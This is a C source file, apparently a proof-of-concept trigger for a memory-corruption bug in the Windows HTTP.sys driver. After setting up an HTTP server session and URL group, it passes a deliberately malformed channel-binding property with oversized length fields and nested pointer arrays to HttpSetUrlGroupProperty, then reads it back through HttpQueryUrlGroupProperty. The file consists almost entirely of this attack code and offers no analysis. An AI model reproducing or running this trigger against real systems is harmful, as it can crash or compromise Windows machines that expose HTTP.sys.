#define SECURITY_WIN32
#include <http.h>
#include <sspi.h>
#include <strsafe.h>
#pragma warning(disable:4127)   // condition expression is constant

int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[]
)
{
    int i;
    HANDLE          hReqQueue = NULL;
    HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2;
    HTTP_SERVER_SESSION_ID ssID = HTTP_NULL_ID;
   
    HTTP_BINDING_INFO BindingProperty;
    HTTP_TIMEOUT_LIMIT_INFO CGTimeout;
    ULONG           retCode;
    HTTP_URL_GROUP_ID urlGroupId = HTTP_NULL_ID;


    //
    // 初始化 HTTP APIs.
    //
    retCode = HttpInitialize(
        HttpApiVersion,
        HTTP_INITIALIZE_SERVER,    // Flags
        NULL                       // Reserved
    );

    if (retCode != NO_ERROR)
    {
        wprintf(L"HttpInitialize failed with %lu \n", retCode);
        return retCode;
    }

    //
    // 创建一个服务器会话句柄
    //
    retCode = HttpCreateServerSession(
        HttpApiVersion,
        &ssID,
        0);


    if (retCode != NO_ERROR)
    {
        wprintf(L"HttpCreateServerSession failed with %lu \n", retCode);
        return;
    }

    //
    // 创建 UrlGroup 句柄
    //
    retCode = HttpCreateUrlGroup(ssID,
        &urlGroupId,
        0);


    if (retCode != NO_ERROR)
    {
        wprintf(L"HttpCreateUrlGroup failed with %lu \n", retCode);
        return;
    }

    ULONGLONG data1[4] = { 0 };
    ULONGLONG data3[0x21] = { 0 };
    ULONGLONG data[0x1000] = { 0 };
    BYTE data_temp1[0x1000] = { 0 };
    DWORD return_len = 0;

    WCHAR* str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0);
    WCHAR str_test[0xfffe] = L"192.168.205.155:8081";
    memcpy(str, str_test, 0x20);
    
    data1[0] = 0x01;
    data1[1] = str;
    data1[2] = 0xfffffe0-0xf0f0f0;
    
    for (int i = 0; i < 0x11; i++)
    {
        data3[i] = data1;
    }
    data[5] = 0x20;
    data[3] = 0x0c;
    data[2] = 0x11;
    data[0] = 0x1;
    data[1] = data3;

    retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty,&data,0x20);
    retCode = HttpQueryUrlGroupProperty(urlGroupId,HttpServerChannelBindProperty,&data_temp1,0x140, &return_len);
}
